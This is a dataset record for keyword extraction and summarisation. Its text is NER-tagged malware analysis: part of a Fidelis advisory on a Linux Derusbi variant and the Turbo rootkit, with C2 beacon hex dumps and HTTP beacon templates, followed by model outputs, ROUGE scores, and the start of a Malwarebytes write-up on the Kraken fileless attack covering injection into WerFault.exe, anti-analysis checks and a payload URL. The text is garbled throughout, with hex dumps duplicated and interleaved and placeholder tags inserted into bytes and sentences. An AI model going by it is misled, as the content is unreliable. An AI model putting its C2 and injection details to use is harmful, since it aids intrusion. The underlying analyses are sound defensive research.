[CARDINAL] 01 00 14 33 2E 31 33 [CARDINAL] 2E [CARDINAL] 30 [CARDINAL] 2D 35 35 [CARDINAL] 2D .\u00dc 3.13.0 - 55- 00000060 67 65 6E 65 72 00 23 39 34 2D 55 62 75 6E 74 75 gener # [MONEY] 94 - Ubuntu 00000070 20 53 4D 50 20 00 78 38 36 5F 36 34 28 00 01 [CARDINAL] 9C SMP x86_64 ( \u0153 00000080 09 06 20 76 65 72 73 69 [CARDINAL] 6F 6E 20 2D F4 00 00 [CARDINAL] 11 version -\u00f4 00000090 69 63 20 28 62 75 69 6C 64 64 40 62 72 [CARDINAL] 6F 77 6E ic ( buildd@brown 000000A0 69 65 29 20 00 67 63 63 20 76 65 72 73 69 [CARDINAL] 6F 6E ie ) gcc version 000000B0 [CARDINAL] 20 34 00 11 00 00 4The \t above \t data \t can \t be \t decoded \t with \t the \t highlighted \t XOR \t key \t ( 0xF7 \t C8 \t [CARDINAL] 2D \t 3E ) . \t When \t the \t key \t is \t applied , the \t following \t decoded \t data \t is \t displayed: \u00a9 [PERSON] Fidelis [PERSON] Cybersecurity12The \t above \t data \t contains \t victim \t system \t information . \t Attribution \t data \t has \t been \t obscured \t by \t the \t analyst . After \t the \t victim \t system \t beaconed \t with \t the \t above \t data , \t the \t C2 \t responded \t with \t the \t following : TA_Fidelis_Turbo_1602Offset 0 1 2 3 4 5 6 7 8 9 A B C D E FThe above data can be decoded with the highlighted XOR key ( 0xF7 C8 2D 3E ) . When the key is applied , the following decoded data is displayed : The \t above \t data \t can \t be \t decoded \t with \t the \t highlighted \t XOR \t key \t ( 0xF7 \t C8 \t [CARDINAL] 2D \t 3E ) . \t When \t the \t key \t is \t applied , the \t following \t decoded \t data \t is \t displayed : The \t above \t data \t can \t be \t decoded \t with \t the \t highlighted \t XOR \t key \t ( 0xF7 \t C8 \t [CARDINAL] 2D \t 3E ) . \t When \t the \t key \t is \t applied , the \t following \t decoded \t data \t is \t displayed:00000020 [CARDINAL] 9B FA 00 3E [CARDINAL] D7 D0 2D 3E F4 AA 00 00 00 00 00 00 \u203a\u00fa > \u00d7\u00d0->\u00f4\u00aaDQ\u0192\u00a5 [CARDINAL] 00000000 B6 00 00 00 01 00 00 00 60 29 00 00 [CARDINAL] F7 [ORG] C8 [CARDINAL] 2D 3E \u00b6 ` ) \u00f7\u00c8- > 00000030 EF [CARDINAL] 30 2D 34 F7 [CARDINAL] 20 [CARDINAL] 20 [CARDINAL] 20 D9 20 03 20 20 E6 20 20 \u00ef0 - 4\u00f7 \u00d9 \u00e6 00000010 01 00 00 00 3C 01 00 00 FF [CARDINAL] 05 E1 32 B7 00 00 00 < \u00ff \u00e12 \u00b7 00000040 20 20 39 3F F1 CA [CARDINAL] 2D 3E [CARDINAL] F7 [CARDINAL] 84 44 50 [CARDINAL] 82 B0 04 BE 9?\u00f1\u00ca->\u00f7\u201eDP \u201a \u00b0 \u00be [DATE] 00000020 [DATE] 9B FA 00 3E [CARDINAL] D7 D0 2D 3E F4 AA 00 00 00 00 00 00 \u203a\u00fa > \u00d7\u00d0->\u00f4\u00aaDQ\u0192\u00a5 [CARDINAL] 00000050 F7 E6 F1 [CARDINAL] 3F F7 DC 1E 10 C6 FB [CARDINAL] 03 [ORG] 0E [ORG] DA [ORG] FD [CARDINAL] 18 [CARDINAL] 13 \u00f7\u00e6\u00f1?\u00f7\u00dc \u00c6\u00fb \u00da\u00fd 00000030 EF [CARDINAL] 30 2D 34 F7 [CARDINAL] 20 [CARDINAL] 20 [CARDINAL] 20 D9 20 03 20 20 E6 20 20 \u00ef0 - 4\u00f7 \u00d9 \u00e6 00000060 [DATE] 90 [DATE] AD [DATE] 43 5B 85 [CARDINAL] C8 0E 07 C3 E5 78 5C 82 A6 59 4B \ufffd -C[ \u2026 \u00c8 \u00c3\u00e5x\\\u201a \u00a6 YK 00000040 20 20 39 3F F1 CA [CARDINAL] 2D 3E [CARDINAL] F7 [CARDINAL] 84 44 50 [CARDINAL] 82 B0 04 BE 9?\u00f1\u00ca->\u00f7\u201eDP \u201a \u00b0 \u00be [DATE] 00000070 D7 9B 60 6E D7 C8 [DATE] 55 [DATE] 06 C1 97 1B 0A DF C8 2C A2 \u00d7\u203a`n\u00d7\u00c8U \u00c1 \u2014 \u00df\u00c8,\u00a2 00000050 F7 E6 F1 [CARDINAL] 3F F7 DC 1E 10 C6 FB [CARDINAL] 03 [ORG] 0E [ORG] DA [ORG] FD [CARDINAL] 18 [CARDINAL] 13 \u00f7\u00e6\u00f1?\u00f7\u00dc \u00c6\u00fb \u00da\u00fd 00000080 FE CE 0D [CARDINAL] 48 [CARDINAL] 92 [ORG] BA 5E 57 98 A6 0D 13 03 [ORG] C8 2D 2F \u00fe\u00ce [GPE] H\u2019\u00ba^W\u02dc \u00a6 \u00c8-/ 00000060 [DATE] 90 [DATE] AD [DATE] 43 5B 85 [CARDINAL] C8 0E 07 C3 E5 78 5C 82 A6 59 4B \ufffd -C[ \u2026 \u00c8 \u00c3\u00e5x\\\u201a \u00a6 YK 00000090 9E AB 0D 16 95 [ORG] BD 44 52 [CARDINAL] 93 [ORG] AC 6D 5C 85 A7 5A 50 \u017e \u00ab \u2022\u00bdDR\u201c\u00acm\\ \u2026 \u00a7ZP [CARDINAL] 00000070 D7 9B 60 [PRODUCT] 6E [PRODUCT] D7 [PRODUCT] C8 [DATE] 55 [DATE] 06 C1 97 1B 0A DF C8 2C A2 \u00d7\u203a`n\u00d7\u00c8U \u00c1 \u2014 \u00df\u00c8,\u00a2 000000A0 9E AD 04 [CARDINAL] 1E F7 AF [CARDINAL] 4E [CARDINAL] 5D D7 BE [CARDINAL] 48 4C [CARDINAL] 84 [QUANTITY] A1 [QUANTITY] 42 [QUANTITY] 50 [QUANTITY] \u017e- [QUANTITY] \u00f7\u00afN]\u00d7\u00beHL\u201e\u00a1BP 00000080 FE CE 0D [CARDINAL] 48 [CARDINAL] 92 [ORG] BA 5E 57 98 A6 0D 13 03 [ORG] C8 2D 2F \u00fe\u00ce H\u2019\u00ba^W\u02dc \u00a6 \u00c8-/ [CARDINAL] 000000B0 D7 FC 2D 2F [PRODUCT] F7 [PRODUCT] C8 [PRODUCT] \u00d7\u00fc-/\u00f7\u00c8 [PRODUCT] 00000090 [PRODUCT] 9E [PRODUCT] AB 0D 16 95 [ORG] BD 44 52 [CARDINAL] 93 [ORG] AC 6D 5C 85 A7 5A 50 \u017e \u00ab \u2022\u00bdDR\u201c\u00acm\\ \u2026 \u00a7ZP [CARDINAL] 000000A0 9E AD 04 [CARDINAL] 1E F7 AF [CARDINAL] 4E [CARDINAL] 5D D7 BE [CARDINAL] 48 4C [CARDINAL] 84 [QUANTITY] A1 [QUANTITY] 42 [QUANTITY] 50 [QUANTITY] \u017e- \u00f7\u00afN]\u00d7\u00beHL\u201e\u00a1BP 000000B0 D7 FC 2D 2F [PRODUCT] F7 [PRODUCT] C8 [PRODUCT] \u00d7\u00fc-/\u00f7\u00c8 [PRODUCT] Offset 0 1 2 3 4 5 6 7 8 9 A B C D E F 00000000 [CARDINAL] 41 [ORG] C8 2D 3E F6 [ORG] C8 [CARDINAL] 2D 3E [CARDINAL] 97 E1 2D 3E 00 00 00 00 A\u00c8->\u00f6\u00c8->\u2014\u00e1- > Offset 0 1 2 3 4 5 6 7 8 9 A B C D E F 00000010 F6 [ORG] C8 [ORG] 2D [ORG] 3E CB C9 2D 3E [CARDINAL] 08 CD CC 0C 40 00 00 00 \u00f6\u00c8->\u00cb\u00c9- > \u00cd\u00cc @ 00000020 6C 32 2D 00 20 18 00 00 03 62 00 00 00 00 00 00 l2- 00000000 [CARDINAL] 41 [ORG] C8 2D 3E F6 [ORG] C8 [CARDINAL] 2D 3E [CARDINAL] 97 E1 2D 3E 00 00 00 00 A\u00c8->\u00f6\u00c8->\u2014\u00e1- > 00000030 18 F8 00 [ORG] 0A 00 20 20 20 [CARDINAL] 2E [CARDINAL] 20 [CARDINAL] 2E [CARDINAL] 20 20 [CARDINAL] 2E [CARDINAL] 20 [CARDINAL] 20 \u00f8 . . . [CARDINAL] 00000010 F6 [ORG] C8 [ORG] 2D [ORG] 3E CB C9 2D 3E [CARDINAL] 08 CD CC 0C 40 00 00 00 \u00f6\u00c8->\u00cb\u00c9- > \u00cd\u00cc @ 00000040 20 20 14 01 06 02 00 00 00 [CARDINAL] 4C [CARDINAL] 69 6E 75 78 29 80 [ORG] Linux)\u20ac 00000020 6C [CARDINAL] 32 2D 00 20 18 00 00 03 62 00 00 00 00 00 00 l2- 00000050 00 2E DC [CARDINAL] 01 00 14 33 2E 31 33 [CARDINAL] 2E [CARDINAL] 30 [CARDINAL] 2D 35 35 [CARDINAL] 2D .\u00dc 3.13.0 - 55- 00000030 [CARDINAL] 18 F8 00 [ORG] 0A 00 20 20 20 [CARDINAL] 2E [CARDINAL] 20 [CARDINAL] 2E [CARDINAL] 20 20 [CARDINAL] 2E [CARDINAL] 20 [CARDINAL] 20 \u00f8 . . . 00000060 67 65 6E 65 72 00 23 39 34 2D 55 62 75 6E 74 75 gener # [MONEY] 94 - Ubuntu 00000040 20 20 14 01 06 02 00 00 00 [CARDINAL] 4C [CARDINAL] 69 6E 75 78 29 80 Linux)\u20ac 00000070 20 53 4D 50 20 00 78 38 36 5F 36 34 28 00 01 [CARDINAL] 9C SMP x86_64 ( \u0153 00000050 00 2E DC [CARDINAL] 01 00 14 33 2E 31 33 [CARDINAL] 2E [CARDINAL] 30 [CARDINAL] 2D 35 35 [CARDINAL] 2D .\u00dc 3.13.0 - 55- 00000080 [CARDINAL] 09 06 20 76 65 72 73 69 [CARDINAL] 6F 6E 20 2D F4 00 00 [CARDINAL] 11 version -\u00f4 00000060 67 65 6E 65 72 00 23 39 34 2D 55 62 75 6E 74 75 gener # [MONEY] 94 - Ubuntu 00000090 69 63 20 28 62 75 69 6C 64 64 40 62 72 [CARDINAL] 6F 77 6E ic ( buildd@brown 00000070 20 53 4D 50 20 00 78 38 36 5F 36 34 28 00 01 [CARDINAL] 9C SMP x86_64 ( \u0153 000000A0 69 65 29 20 00 67 63 63 20 76 65 72 73 69 [CARDINAL] 6F 6E ie ) gcc version [CARDINAL] 00000080 09 06 20 76 65 72 73 69 [CARDINAL] 6F 6E 20 2D F4 00 00 [CARDINAL] 11 version -\u00f4 000000B0 [CARDINAL] 20 34 00 11 00 00 4 00000090 69 63 20 28 62 75 69 6C 64 64 40 62 72 [CARDINAL] 6F 77 6E ic ( buildd@brown 000000A0 69 65 29 20 00 67 63 63 20 76 65 72 73 69 [CARDINAL] 6F 6E ie ) gcc version 000000B0 [CARDINAL] 20 34 00 11 00 00 [CARDINAL] 4The above data contains victim system information . Attribution data has been obscured by the analyst . The \t above \t data \t contains \t victim \t system \t information . \t Attribution \t data \t has \t been \t obscured \t by \t the \t analyst . The \t above \t data \t contains \t victim \t system \t information . \t Attribution \t data \t has \t been \t obscured \t by \t the \t analyst . After \t the \t victim \t system \t beaconed \t with \t the \t above \t data , \t the \t C2 \t responded \t with \t the \t following : After \t the \t victim \t system \t beaconed \t with \t the \t above \t data , \t the \t C2 \t responded \t with \t the \t following : After the victim system beaconed with the above data , the [CARDINAL] C2 responded with the following : Offset [CARDINAL] 0 1 2 3 4 5 6 7 8 9 A B C D E F 00000000 2D 00 00 00 02 00 00 00 42 00 00 00 42 04 E6 2A - B B \u00e6 * Offset [CARDINAL] 0 1 2 3 4 5 6 7 8 9 A B C D E F 00000010 01 00 00 00 18 00 00 00 40 04 E6 2A 42 04 CF 2A @ \u00e6*B \u00cf * [DATE] 00000020 [DATE] 42 [DATE] 01 E7 2A 42 04 E6 2A 42 [CARDINAL] 04 [CARDINAL] F7 2A [CARDINAL] 42 B \u00e7*B \u00e6*B \u00f7*B 00000000 [CARDINAL] 2D 00 00 00 02 00 00 00 42 00 00 00 42 04 E6 2A - B B \u00e6 * [DATE] 00000010 [DATE] 01 [DATE] 00 [DATE] 00 00 18 00 00 00 40 04 E6 2A 42 04 CF 2A @ \u00e6*B \u00cf * [DATE] 00000020 [DATE] 42 [DATE] 01 E7 2A 42 04 E6 2A 42 [CARDINAL] 04 [CARDINAL] F7 2A [CARDINAL] 42 B \u00e7*B \u00e6*B \u00f7*BThe [ORDINAL] second beacon from the victim system also contained [ORG] XOR encoded data using the following key : [CARDINAL] 0x3A D1 7B DC . When the data was decoded , the [CARDINAL] C2 domain and port were revealed and also what appeared to be the campaign code . Like with the previous case , the XOR key was contained between bytes [CARDINAL] 13 - 16 of the beacon . Additionally , the following HTTP headers were extracted from the sample . Note that these are perfectly in sync with observations made with over [CARDINAL] 25 samples representing multiple Windows variants of [ORG] Derusbi that have been observed since [DATE] 2011 . We achieved this validation using a custom [PERSON] Yara rule . The hashes for these files and the [PERSON] Yara rule are present in our github repository . The use of a common beacon protocol is highly suggestive of infrastructure reuse on the command and control server . While the component installed on the victim machine is a new implementation , purpose built for Linux , the server infrastructure can be reused . POST /photos / photo.asp HTTP/1.1 HOST : % s:%d User - Agent : Mozilla/4.0 Proxy - Connection : Keep - Alive Connection : Keep - Alive Pragma : no - cacheCONNECT [ORG] % s:%d HTTP/1.1 HOST : % s:%d Content - Length : 0 User - Agent : Mozilla/4.0 Proxy - Connection : Keep - Alive Pragma : no - cache \u00a9 [ORG] Fidelis [ORG] CybersecurityTA_Fidelis_Turbo_160213CONNECT [ORG] % s:%d HTTP/1.1 HOST : % s:%d Content - Length : 0 User - Agent : Mozilla/4.0 Proxy - Connection : Keep - Alive Pragma : no - cache Proxy - Authorization : Basic % sHTTP/1.1 [CARDINAL] 200 OK Server : Apache [CARDINAL] 1.3.19 Cache - Control : no - cache Pragma : no - cache Expires : [CARDINAL] 0 Connection : Keep - Alive Content - Type : application / octet - stream Content - Length : [CARDINAL] 0POST /Catelog / login1.asp [ORG] HTTP/1.1 Host : [ORG] % s:%d User - Agent : [PERSON] Mozilla/4.0 ( compatible ; [ORG] MSIE [CARDINAL] 6.0 ; Windows NT [CARDINAL] 5.1 ) Cache - Control : no - cache Pragma : no - cache Connection : Keep - Alive Content - Type : application / x - octet - stream Content - Length : % dHTTP/1.1 [CARDINAL] 200 OK Server : Apache [CARDINAL] 1.3.19 Cache - Control : no - cache Pragma : no - cache Expires : [CARDINAL] 0 Connection : Keep - Alive Content - Type : application / x - octet - stream Content - Length : % dGET /Query.asp?loginid=112037 HTTP/1.1 User - Agent : [PERSON] Mozilla/4.0 ( compatible ; [ORG] MSIE [CARDINAL] 6.0 ; Windows NT [CARDINAL] 5.1 ) Host : % s:%d Cache - Control : no - cache Pragma : no - cache Connection : Keep - AliveIn addition to the HTTP C2 beacons , during execution of the shared object , a non - HTTP custom beacon was observed . The beacon content is [DATE] 64 bytes in length and random during every occurrence. \u00a9 Fidelis CybersecurityTA_Fidelis_Turbo_160214The [PERSON] Fidelis [CARDINAL] TakeOur research has uncovered similarities of this [PERSON] Derusbi [CARDINAL] 64 - bit Linux variant with multiple version of [PERSON] Derusbi for the Windows operating system , potentially making a closer correlation between the actors behind this high - profile malware . The shared infrastructure and capabilities between this Linux variant of [PERSON] Derusbi and Windows variants highlight this continued evolution . The use of [PERSON] Derusbi and the [ORG] Turbo [ORG] Linux kernel module in this campaign reveal considerable sophistication . Threat actors continue to expand their capabilities by updating and modifying the tools they use . This investment allows them to maintain / increase access and cover a larger portion of the victim \u2019s infrastructure , in this case into the Linux [CARDINAL] 64 - bit environment . This research also shows how these threat actors implement advanced techniques , but also how artifacts from the network intrusion can still be detected by network defenders and incident responders . Fidelis [ORG] Cybersecurity \u2019s products detect the activity documented in this paper and additional technical indicators are published in the appendices of this paper and to the [FAC] Fidelis [FAC] Cybersecurity github at url Newcomers in the [PERSON] Derusbi family , [DATE] Dec [DATE] 2015 : url [WORK_OF_ART] Exploring Bergard : [WORK_OF_ART] Old [WORK_OF_ART] Malware with New Tricks : url am HDRoot ! Part [CARDINAL] 2 , Oct [DATE] 2015 : url [PERSON] Derusbi ( Server Variant ) Analysis , Nov [DATE] 2014 : url [ORG] Catching the silent whisper : understanding the [PERSON] Derusbi family tree , Oct [DATE] 2015 : url [LOC] Shell_Crew , [DATE] Jan [DATE] 2014 : url [ORG] ThreatConnect [ORG] Research [ORG] Team . ( [DATE] 2015 , [DATE] June [DATE] 5 ) . OPM Breach Analysis : url [ORG] ThreatConnect [ORG] Research [ORG] Team . ( [DATE] 2015 , Feburary [CARDINAL] 27 ) . [WORK_OF_ART] The [WORK_OF_ART] Anthem Hack : All Roads Lead to [GPE] China : url ASERT Threat Intelligence Report \u2014 Uncovering the Seven Pointed Dagger . ( [DATE] 2016 , [DATE] January [DATE] 11 ): url Barnett , [ORG] E. ( 2012 , [DATE] September [DATE] 2 ) . The growing threat of domain squatters : url htmlUsers are granted permission to copy and/or distribute this document in its original electronic form and print copies for personal use . This document can not be modified or converted to any other electronic or machine - readable form in whole or in part without prior written approval of [ORG] Fidelis [ORG] Cybersecurity , [ORG] Inc. While we have done our best to ensure that the material found in this document is accurate , [PERSON] Fidelis [PERSON] Cybersecurity , Inc. makes no guarantee that the information contained herein is error free. \u00a9 Fidelis CybersecurityTA_Fidelis_Turbo_160215", "generated_text": "FIDELIS THREAT ADVISORY; a campaign; Chinese; Derusbi; a 64-bit Linux kernel module; a campaign; the Linux kernel module; command; control; PlugX samples; Windows systems; the malware; command and control infrastructure; XOR; the kernel module; the binary; the configuration; the Linux version; the target system; the components; the kernel module; cloaking; an investment; additional footholds; a victim; their infrastructure; the Linux variant; the attackers; the Linux variant; application; data; tactics; detection.", "ref_text": "<START-1>The document analyzes a Linux variant of the Derusbi malware used in a campaign dubbed \"Turbo\" that targeted a U.S. public research institution in 2015. The 64-bit Linux sample is notable as most Derusbi variants target Windows. Analysis revealed the use of a malicious Linux kernel module called Turbo that was dropped and installed to hide processes. Both the malware and kernel module use anti-forensics techniques like running only in memory and overwriting data to evade detection. The malware gathers system info like GCC version, likely to aid in recompiling the malware or kernel module on the victim system. The malware creates a raw network socket for command and control communication, mimicking Windows Derusbi samples in terms of HTTP headers and encryption. It can execute commands, provide a remote shell, and perform file operations. Turbo hooks the system call table to hide processes specified by the malware. It uses a netlink socket for kernel-to-userspace communication. The malware sends module requests like hide_pid() to control Turbo's process hiding. The report suggests the Derusbi developer may be actively involved in operations, with samples recompiled on deployment day. Shared infrastructure with Windows PlugX samples also indicates coordinated use of tools. The investment to port Derusbi to Linux and continued evolution of tactics/tools highlights the adversary's sophistication and motivation to expand access into Linux environments beyond Windows. Detection requires proactive threat hunting across endpoints and networks. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5307855626326963, "gpt3/lexical/rouge_rouge2": 0.14072494669509597, "gpt3/lexical/rouge_rougeL": 0.23779193205944799, "gpt3/lexical/rouge_rougeLsum": 0.23779193205944799, "gpt3_generated_text": ["This Fidelis Threat Advisory discusses a campaign called Turbo that features a 64-bit Linux variant of the Derusbi malware. Derusbi is a malware associated with Chinese threat actors and has been used in high-profile incidents such as the Wellpoint/Anthem breach. The Linux variant of Derusbi is unique as it is the only 64-bit Linux sample observed. The campaign also involves a Linux kernel module called Turbo, which demonstrates cloaking and anti-analysis techniques. The Derusbi sample shares command and control infrastructure with PlugX samples targeting Windows systems. The binary and kernel module were tailored to match the configuration of the target system, indicating the active participation of developers. The use of the Linux variant bypasses Windows-only detection and remediation platforms, creating new exposures for enterprises. The article provides IOCs and a Yara rule to help identify other samples of this malware. The campaign involved the adversary gaining SSH access to the target system and using wget to fetch the malware samples. Command and control communications were observed going to a URL also seen in PlugX samples. The binary was compiled on the same day it was installed, suggesting developer involvement. The campaign utilized sub-domains for campaign identification and potential impersonation. This article highlights the importance of detecting and mitigating threats targeting Linux systems as they are widely used in data centers and critical applications."]}, {"split_name": "test", "sample_id": "test_7", "prompt_text": "Extract the keywords: 10/8/2020Release the [ORG] Kraken : Fileless APT attack abuses [PRODUCT] Windows [PRODUCT] Error [PRODUCT] Reporting service - Malwarebytes Labs | Malwarebytes LabsRelease the [ORG] Kraken : Fileless APT attack abuses [ORG] Windows [ORG] Error [ORG] Reporting [ORG] serviceblog.malwarebytes.com/malwarebytes-news/2020/10/kraken-attack-abuses-wer-serviceThreat Intelligence TeamOctober 6 , 2020This blog post was authored by [PERSON] Hossein [PERSON] Jazi and [GPE] J\u00e9r\u00f4me [GPE] Segura . On [DATE] September [DATE] 17th , we discovered a new attack called [ORG] Kraken that injected its payload into [LAW] the [LAW] Windows [LAW] Error [LAW] Reporting ( [ORG] WER ) service as a defense evasion mechanism . That reporting service , [GPE] WerFault.exe , is usually invoked when an error related to the operating system , [PRODUCT] Windows features , or applications happens . When victims see [PERSON] WerFault.exe running on their machine , they probably assume that some error happened , while in this case they have actually been targeted in an attack . While this technique is not new , this campaign is likely the work of an [ORG] APT group that had earlier used a phishing attack enticing victims with a worker \u2019s compensation claim . The threat actors compromised a website to host its payload and then used the [ORG] CactusTorch framework to perform a fileless attack followed by several anti - analysis techniques . At the time of writing , we could not make a clear attribution to who is behind this attack , although some elements remind us of the [NORP] Vietnamese APT32 group . Malicious lure : \u2018 your right to compensation\u2019On [DATE] September [DATE] 17 , we found a new attack starting from a zip file containing a malicious document most likely distributed through spear phishing attacks . The document \u201c Compensation manual.doc \u201d pretends to include information about compensation rights for workers : url the Kraken : Fileless APT attack abuses [PRODUCT] Windows [PRODUCT] Error [PRODUCT] Reporting service - Malwarebytes Labs | [GPE] Malwarebytes LabsFigure [CARDINAL] 1 : Malicious [ORG] DocumentThe file contains an image tag ( \u201c INCLDEPICTURE \u201c ) that connects to \u201c yourrighttocompensation[.]com \u201d and downloads an image that will be the document template . Figure [CARDINAL] 2 : Imagetag embedded within the documenturl the [ORG] Kraken : Fileless APT attack abuses [PRODUCT] Windows [PRODUCT] Error [PRODUCT] Reporting service - Malwarebytes Labs | [GPE] Malwarebytes LabsFigure [CARDINAL] 3 : yourrighttocompensation websiteThis domain was registered on 2020 - 06 - 05 while the document creation time is 2020- 06 - 12 , which likely indicates that they are part of the same attack . Inside , we see a malicious macro that uses a modified version of [ORG] CactusTorch [ORG] VBA module to execute its shellcode . [ORG] CactusTorch is leveraging the DotNetToJscript technique to load a .Net compiled binary into memory and execute it from vbscript . The following figure shows the macro content used by this threat actor . It has both [ORG] AutoOpen and [ORG] AutoClose functions . [ORG] AutoOpen just shows an error message while [ORG] AutoClose is the function that performs the main activity.url the Kraken : Fileless APT attack abuses [PRODUCT] Windows [PRODUCT] Error [PRODUCT] Reporting service - Malwarebytes Labs | [GPE] Malwarebytes LabsFigure [CARDINAL] 4 : MacroAs you can see in Figure [CARDINAL] 4 , a serialized object in hex format has been defined which contains a .Net payload that is being loaded into memory . Then , the macro defined an entry class with \u201c [FAC] Kraken . [ORG] Kraken \u201d as value . This value has [CARDINAL] two parts that have been separated with a dot : the name of the .Net Loader and its target class name . In the next step , it creates a serialization [ORG] BinaryFormatter object and uses the deseralize function of [ORG] BinaryFormatter to deserialize the object . Finally , by calling [PRODUCT] DynamicInvoke the .Net payload will be loaded and executed from memory . Unlike [PERSON] CactusTorch [PERSON] VBA that specifies the target process to inject the payload into it within the macro , this actor changed the macro and specified the target process within the .Net payload . [ORG] Kraken LoaderThe loaded payload is a .Net [ORG] DLL with \u201c [ORG] Kraken.dll \u201d as its internal name , compiled on [DATE] 2020-06-12.url the [ORG] Kraken : Fileless APT attack abuses [PRODUCT] Windows [PRODUCT] Error [PRODUCT] Reporting service - Malwarebytes Labs | Malwarebytes LabsThis [ORG] DLL is a loader that injects an embedded shellcode into [GPE] WerFault.exe . To be clear , this is not the [ORDINAL] first case of such a technique . It was observed before with the NetWire RAT and even the [PERSON] Cerber ransomware . The loader has [CARDINAL] two main classes : \u201c [WORK_OF_ART] Kraken \u201d and \u201c Loader\u201c . Figure [CARDINAL] 5 : [PERSON] Kraken.dllThe [PERSON] Kraken class contains the shellcode that will be injected into the target process defined in this class as \u201c WerFault.exe \u201c . It only has [CARDINAL] one function that calls the Load function of Loader class with shellcode and target process as parameters.url the Kraken : Fileless APT attack abuses [PRODUCT] Windows [PRODUCT] Error [PRODUCT] Reporting service - Malwarebytes Labs | [GPE] Malwarebytes LabsFigure [CARDINAL] 6 : Kraken classThe Loader class is responsible for injecting shellcode into the target process by making [PRODUCT] Windows API calls.url the [ORG] Kraken : Fileless APT attack abuses [PRODUCT] Windows [PRODUCT] Error [PRODUCT] Reporting service - Malwarebytes Labs | [GPE] Malwarebytes LabsThese are the steps it uses to perform its process injection : Figure [CARDINAL] 7 : Load functionStartProcess function calls [PRODUCT] CreateProcess [PRODUCT] Windows API with [DATE] 800000C as dwCreateFlags . FindEntry calls [PERSON] ZwQueryInformationProcess to locate the base address of the target process . CreateSection invokes the ZwCreateSection API to create a section within the target process . ZwMapViewOfSection is called to bind the section to the target process in order to copy the shellcode in by invoking [ORG] CopyShellcode . MapAndStart finishes the process injection by calling [PERSON] WriteProcessMemory and [ORG] ResumeThread . [PERSON] ShellCode [PERSON] AnalysisUsing [PERSON] HollowHunter we dumped the shell code injected into [GPE] WerFault.exe for further analysis . This [ORG] DLL performs its malicious activities in multiple threads to make its analysis harder . This [ORG] DLL is executed by calling the \u201c DllEntryPoint \u201d that invokes the \u201c Main \u201d function.url the [ORG] Kraken : Fileless APT attack abuses [PRODUCT] Windows [PRODUCT] Error [PRODUCT] Reporting service - Malwarebytes Labs | [GPE] Malwarebytes LabsFigure [CARDINAL] 8 : [ORG] Main [ORG] ProcessThe main function calls [PERSON] DllMain which creates a thread to perform its functions in a new thread within the context of the same process . Figrue 9 : Dll mainThe created thread at [ORDINAL] first performs some anti - analysis checks to make sure it \u2019s not running in an analysis / sandbox environment or in a debugger . It does this through the following actions : url the Kraken : Fileless APT attack abuses [PRODUCT] Windows [PRODUCT] Error [PRODUCT] Reporting service - Malwarebytes Labs | Malwarebytes Labs1 ) Checks existence of a debugger by calling GetTickCount : GetTickCount is a timing function that is used to measure the time needed to execute some instruction sets . In this thread , it is being called [CARDINAL] two times before and after a Sleep instruction and then the difference is being calculated . If it is not equal to [CARDINAL] 2 the program exits , as it identifies it is being debugged.2 ) VM detection : Figure [CARDINAL] 10 : Created threadIn this function , it checks if it is running in [ORG] VmWare or [ORG] VirtualBox by extracting the provider name of the display driver registry key ( ` SYSTEM\\\\ControlSet001\\\\Control\\\\Class\\\\{4D36E968 - E325 - 11CE - BFC1- [DATE] 08002BE10318}\\\\0000\u2032 ) and then checking if it contains the strings [ORG] VMware or [ORG] Oracle.url the [ORG] Kraken : Fileless APT attack abuses [PRODUCT] Windows [PRODUCT] Error [PRODUCT] Reporting service - Malwarebytes Labs | Malwarebytes Labs3 ) IsProcessorFeaturePresent : Figure [CARDINAL] 11 : VM detectionThis API call has been used to determine whether the specified processor feature is supported or not . As you see from the below picture , \u201c 0x17 \u201d has been passed to this API as a parameter which means it checks _ _ fastfail support before proceeding with immediate termination.url the [ORG] Kraken : Fileless APT attack abuses [PRODUCT] Windows [PRODUCT] Error [PRODUCT] Reporting service - Malwarebytes Labs | [GPE] Malwarebytes [PRODUCT] LabsFigure [PRODUCT] 12 : InProcessorFeaturePresent4 ) NtGlobalFlag : The shell code checks NtGlobalFlag in PEB structure to identify whether it is being debugged or not . To identify the debugger it compares the NtGlobalFlag value with 0x70.5 ) IsDebuggerPresent : This checks for the presence of a debugger by calling \u201c IsDebuggerPresent\u201c.url the [ORG] Kraken : Fileless APT attack abuses [PRODUCT] Windows [PRODUCT] Error [PRODUCT] Reporting service - Malwarebytes Labs | [GPE] Malwarebytes [PRODUCT] LabsFigure [PRODUCT] 13 : NtGlobalFlag and IsDebuggerPresent checkAfter performing all these anti - analysis checks , it goes into a function to create its final shellcode in a new thread . The import calls used in this part are obfuscated and resolved dynamically by invoking the \u201c Resolve_Imports \u201d function . This function gets the address of \u201c kernel32.dll \u201d using LoadLibraryEx and then in a loop retrieves [CARDINAL] 12 imports . Figure [CARDINAL] 14 : Resolve_ImportsUsing the libpeconv library we are able to get the list of resolved API calls . Here is the list of imports , and we can expect it is going to perform some process injection.url the [ORG] Kraken : Fileless APT attack abuses [PRODUCT] Windows [PRODUCT] Error [PRODUCT] Reporting service - Malwarebytes Labs | Malwarebytes LabsVirtualAlloc ResumeThreadAfter resolving the required API calls it creates a memory region using [PRODUCT] VirtualAlloc and then calls \u201c DecryptContent_And_WriteToAllocatedMemory \u201d to decrypt the content of the final shell code and write them into created memory . In the next step , [ORG] VirtualProtect is called to change the protection to the allocated memory to make it executable . Finally , [ORG] CreateThread has been called to execute the final shellcode in a new thread . Figure [CARDINAL] 15 : [PERSON] Resolve [PERSON] Imports and Create new threadFinal [ORG] Shell codeThe final shellcode is a set of instructions that make an HTTP request to a hard - coded domain to download a malicious payload and inject it into a process . As [ORDINAL] first step it loads the Wininet API by calling LoadLibraryA : url the Kraken : Fileless APT attack abuses [PRODUCT] Windows [PRODUCT] Error [PRODUCT] Reporting service - Malwarebytes Labs | [GPE] Malwarebytes LabsFigure [CARDINAL] 16 : [PERSON] Loads [PERSON] WininetThen it builds the list of function calls that are required to make the HTTP request which includes : InternetOpenA , InternetConnectA , InternetOpenRequestA and InternetSetOptionsExA.Figure [CARDINAL] 17 : HttpOpenRequestAAfter preparing the requirements for building HTTP request , it creates a HTTP request and sends it by calling [PERSON] HttpSendrequestExA. The requested URL is : url [PERSON] kotoba[.]net / favicon32.icoFigure [CARDINAL] 18 : HttpSendRequestExAIn the next step , it checks if the HTTP request is successful or not . If the HTTP request is not successful it calls ExitProcess to stop its process.url the [ORG] Kraken : Fileless APT attack abuses [PRODUCT] Windows [PRODUCT] Error [PRODUCT] Reporting service - Malwarebytes Labs | [GPE] Malwarebytes LabsFigure [CARDINAL] 19 : Checking the 